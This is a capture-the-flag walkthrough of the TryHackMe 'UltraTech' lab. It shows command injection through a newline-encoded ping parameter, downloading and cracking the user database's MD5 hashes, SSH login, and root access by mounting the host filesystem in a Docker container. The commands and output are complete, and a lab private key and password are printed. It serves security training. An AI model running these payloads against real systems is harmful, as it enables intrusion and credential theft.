---

Name: UltraTech
Difficulty: Medium
URL: https://tryhackme.com/room/ultratech1
Description: The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing. You have been contracted by UltraTech to pentest their infrastructure. It is a grey-box kind of assessment, the only information you have is the company's name and their server's IP address.

---

# It's enumeration time
For this section I will be using rustscan
```bash
$ rustscan -a fenrir.pro -r 1-65535 --ulimit 5000 -- -sC -sV

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.5
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 08:3e:27:ec:d7:99:b1:9c:0b:10:86:98:64:b5:14:80 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAl+5+eakzVFG2GV8HoSwN4r6/mZ26TyPrVt2ho08WRQZWm7Lo6zgvacbiJ3O9q7KYBh063rR53hgoinWD8K/KctOpUd6fqXbsQeuNQeY8LonyglkcjPQsG+hV1CsuXC8oZuzisYWd8V9uM0PJqGU6OvnX24+dF1hnHmoGoPJ90i4PY9Q4wJGmyC17wxdi/4yQEmgi9YsI84+7d+Mh7jhM/8hbn6eu08kKm/ag5mKfwqbZv3dE7KIlaH8OIzhofYf65ual4G0yQSmTExP25a0N9ld62u3JoHeSgzLcvA5i1NjdTiaz7rCLuLPSQhN3eXch/86wIUMreSGx0v6tt+w6Bd+MQ/eSD49jWMKavG/wdFA04C0QP/gC4Ys1kwva6oChu429Ukhi8FgvRDgpfuBxIENHAR8YLVOG/gxsvoXH7yaH7USOrkL+r1I8NYM+tqm+UkgIGgJfqXncHgWb3q4bMmx7z/uoAz5Uw8iLm5PMwQRQdzDrOdXdvevaWWEqemk=
|   256 6d:0b:9f:a6:9a:58:cf:3a:7f:c1:11:79:8c:bf:0c:6f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO3yQWxrexnadMfSVz48kj+3W4mTuy0p372RIYrx5ABFFNxa9qKM+U5/zGTVdDZA/8Hq0ys+EzgNq4dZAALGKhA=
|   256 25:08:8f:4e:f2:81:7f:02:1c:ff:18:6e:7a:a9:c0:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnM5VTGEpPra+8aniH5PG0kUoV+PkcA9buLBC2DJH7+
8081/tcp  open  http    syn-ack Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Which software is using the port 8081?
The answer is Node.js
```bash
8081/tcp  open  http    syn-ack Node.js Express framework
```

## Which other non-standard port is used?
Since 21 and 22 are standard ports for FTP and SSH, the only one left is 31331
```bash
31331/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
```

## Which software using this port?
Apache is running on it

## Which GNU/Linux distribution seems to be used?
Ubuntu 
```bash
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## The software using the port 8081 is a REST api, how many of its routes are used by the web application?
I've enumerated the api and found these routes
```bash
$  ffuf -u http://fenrir.pro:8081/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fenrir.pro:8081/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

auth                    [Status: 200, Size: 39, Words: 8, Lines: 1, Duration: 33ms]
ping                    [Status: 500, Size: 1094, Words: 52, Lines: 11, Duration: 33ms]
:: Progress: [4751/4751] :: Job [1/1] :: 1117 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

So the answer is likely 2

# Let the fun begin
With gobuster I have found /partners.html, which seems to be the page that is using the auth route
```bash
$ gobuster dir -u http://fenrir.pro:31331 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -x txt,php,html,bak,zip,log -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://fenrir.pro:31331
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              log,txt,php,html,bak,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.hta.txt             (Status: 403) [Size: 278]
.hta.php             (Status: 403) [Size: 278]
.hta.html            (Status: 403) [Size: 278]
.hta.bak             (Status: 403) [Size: 278]
.hta.zip             (Status: 403) [Size: 278]
.hta.log             (Status: 403) [Size: 278]
.htaccess.html       (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htaccess.bak        (Status: 403) [Size: 278]
.htaccess.log        (Status: 403) [Size: 278]
.htaccess.txt        (Status: 403) [Size: 278]
.htaccess.zip        (Status: 403) [Size: 278]
.htaccess.php        (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htpasswd.php        (Status: 403) [Size: 278]
.htpasswd.html       (Status: 403) [Size: 278]
.htpasswd.bak        (Status: 403) [Size: 278]
.htpasswd.zip        (Status: 403) [Size: 278]
.htpasswd.log        (Status: 403) [Size: 278]
.htpasswd.txt        (Status: 403) [Size: 278]
css                  (Status: 301) [Size: 315] [--> http://fenrir.pro:31331/css/]
favicon.ico          (Status: 200) [Size: 15086]
images               (Status: 301) [Size: 318] [--> http://fenrir.pro:31331/images/]
index.html           (Status: 200) [Size: 6092]
index.html           (Status: 200) [Size: 6092]
javascript           (Status: 301) [Size: 322] [--> http://fenrir.pro:31331/javascript/]
js                   (Status: 301) [Size: 314] [--> http://fenrir.pro:31331/js/]
partners.html        (Status: 200) [Size: 1986]
robots.txt           (Status: 200) [Size: 53]
robots.txt           (Status: 200) [Size: 53]
server-status        (Status: 403) [Size: 278]
what.html            (Status: 200) [Size: 2534]
Progress: 33257 / 33257 (100.00%)
===============================================================
Finished
===============================================================
```

![auth](../../../public/images/try_hack_me/ultratech/auth.png)

In the page source we find that api.js is used
```javascript
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

### Exploring the ping route
Likely it is using the ping from linux, maybe we can make it run more commands 
```bash
$ curl "http://fenrir.pro:8081/ping?ip=127.0.0.1%0Aid"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.051 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms
uid=1002(www) gid=1002(www) groups=1002(www)
```

And it worked, adding the %0A (newline URL encoded) we can run any command we want


## There is a database lying around, what is its filename?
Using ls we find utech.db.sqlite
```bash
$ curl "http://fenrir.pro:8081/ping?ip=127.0.0.1%0Als"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.051 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms
1
1nc
index.js
node_modules
package.json
package-lock.json
start.sh
utech.db.sqlite
```

## What is the first user's password hash?
Let's get that file on our device
```bash
$ curl "http://fenrir.pro:8081/ping?ip=127.0.0.1%0Abase64%20-w0%20utech.db.sqlite" \
| tail -n 1 \
| base64 -d > utech.db.sqlite
```

And inspect it
```bash
$ sqlite3 utech.db.sqlite
SQLite version 3.50.2 2025-06-28 14:00:48
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
admin|0d0ea5111e3c1def594c1684e3b9be84|0
r00t|f357a0c52799563c7c7b76c1e7543a32|0
```

## What is the password associated with this hash?
We will use john to crack it, first we sotre it in hash.txt
```bash
$ echo "f357a0c52799563c7c7b76c1e7543a32" > hash.txt
```

Now fire up john with rockyou.txt
```bash
$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX-512 16x3])
Warning: no OpenMP support for this hash type, consider --fork=32
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
n100906          (?)
1g 0:00:00:00 DONE (2026-07-23 16:36) 4.545g/s 23839Kp/s 23839Kc/s 23839KC/s n112008..n0m4m3s
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

We can connect via SSH now
```bash
$ ssh r00t@fenrir.pro
n100906
```

# The root of all evil
## What are the first 9 characters of the root user's private SSH key?

Using `id` we see we are part of the docker group
```bash
$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Members of the docker group are allowed to communicate directly with the Docker daemon. Since the daemon runs as root, this effectively gives us root-level control over the host and can be abused for privilege escalation

We first check which Docker images are available locally:
```bash
$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   7 years ago   15.8MB
```

Since a bash image is already present, we can start a new container and mount the host's root filesystem (/) inside the container at /mnt:
```bash
docker run --rm -it -v /:/mnt bash
```

Although we are inside a container, we now have full access to the host's filesystem through the mounted directory. To make the host filesystem our new root filesystem, we use chroot:
```bash
chroot /mnt /bin/bash
```

This changes the root directory of the current shell to the mounted host filesystem and starts a Bash shell from the host. Since the Docker daemon launched the container with root privileges, we are now effectively operating as root on the host system

With root access, we can read the root user's files, including the SSH private key 
```bash
root@d95d45f45651:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@d95d45f45651:/# whoami
root
root@d95d45f45651:/# cd /root
root@d95d45f45651:~# ls
private.txt  snap
root@d95d45f45651:~# cat private.txt
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful

root@d95d45f45651:~# ls -a
.   .bash_history  .cache   .emacs.d  .npm  .profile         .ssh      private.txt
..  .bashrc        .config  .gnupg    .nvm  .python_history  .viminfo  snap
root@d95d45f45651:~# cat .ssh/
authorized_keys  id_rsa           id_rsa.pub
root@d95d45f45651:~# cat .ssh/
authorized_keys  id_rsa           id_rsa.pub
root@d95d45f45651:~# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```
